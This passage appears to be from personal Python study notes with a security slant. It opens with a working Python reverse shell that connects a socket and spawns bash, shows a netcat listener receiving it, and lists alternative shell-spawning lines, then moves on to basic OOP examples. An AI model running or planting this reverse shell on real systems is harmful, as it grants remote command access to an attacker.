s = socket.socket()
s.connect(("127.0.0.1", 9000))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

```bash
┌──(d41y㉿user)-[~]
└─$ sudo nc -lnvp 9000
Listening on 0.0.0.0 9000
Connection received on 127.0.0.1 44998
d41y@user:~$ id
id
uid=1001(d41y) gid=1001(d41y) Gruppen=1001(d41y),27(sudo),100(users),135(docker)
d41y@user:~$ cd ..
cd ..
d41y@user:/home$
```

```python
# alternative last lines in the code
# subprocess.Popen((["/bin/sh", "-i"]))
# subprocess.call("/bin/bash")
```

#### Replace stdout with a Socket

```python
>>> import socket, sys
>>> s = socket.socket()
>>> sys.stdout = s
>>> print("Hello")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'socket' object has no attribute 'write'
# the socket is missing the .write() method
>>> sys.stdin = s
>>> input()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'socket' object has no attribute 'readline'
# the socket is missing the .readline() method
```

### OOP

#### Accessing the variable

```python
>>> class NewList(list):
...     def sayhi(the_var):
...             print("Hello variable ", the_var)
...     def len(the_var):
...             return len(the_var)
... 
>>> x = NewList([1,2,3,4,5,6,7,8])
>>> y = NewList(["list", "of", "strings"])
>>> x.sayhi()
Hello variable  [1, 2, 3, 4, 5, 6, 7, 8]
>>> y.sayhi()
Hello variable  ['list', 'of', 'strings']
>>> x.len()
8
>>> y.len()
3
```

#### Adding Attributes

```python
>>> x = NewList([1,2,3])
>>> x.NAME = "NumberList"
>>> x.NAME
'NumberList'
>>> dir(x)
['NAME', '__add__', '__class__', '__class_getitem__', '__contains__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getstate__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__module__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'append', 'clear', 'copy', 'count', 'extend', 'index', 'insert', 'len', 'pop', 'remove', 'reverse', 'sayhi', 'sort']
# can set new attributes on most objects at any time
```

```python
>>> class NewList(list):
...     def __init__(self, a_name):
...             self.NAME = a_name
... 
>>> x.NewList("ListOfNumbers")
>>> x = NewList("ListOfNumbers")
>>> x.extend([4,5,6,7])
>>> x
[4, 5, 6, 7]
>>> x.NAME
'ListOfNumbers'
# __init__ is called when you create a new instance of an object
# can use __init__ to set attributes on new instances when they are created
```

#### Calling the Parent init

```python
>>> class NewList(list):
...     def __init__(self, a_name, parent_stuff):
...             self.NAME = a_name
...             super().__init__(parent_stuff)
... 
>>> x = NewList("ListOfNumber", [1,2,3,4,5])
>>> x.NAME
'ListOfNumber'
>>> x
[1, 2, 3, 4, 5]
```
